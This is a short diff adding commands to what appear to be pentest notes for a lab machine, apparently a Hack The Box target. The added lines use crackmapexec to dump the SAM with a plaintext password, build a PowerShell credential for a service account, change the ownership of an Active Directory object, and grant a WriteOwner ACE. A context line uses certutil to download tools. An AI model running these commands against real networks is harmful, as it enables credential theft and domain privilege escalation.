@@ -256,4 +256,18 @@ Results: 21033cea9bb3884f391ee21423396f70
 ```
 
 certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+
+
+crackmapexec smb 10.129.251.165 -u ryan -p WqSZAF6CysDQbGb3  --sam
+
+$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('sequel.htb\ca_svc', $SecPassword)
+
+
+Set-DomainObjectOwner -TargetIdentity dfm -OwnerIdentity harmj0y
+
+
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule( (New-Object System.Security.Principal.NTAccount($identity)), "WriteOwner", "Allow" )
+```
 ```
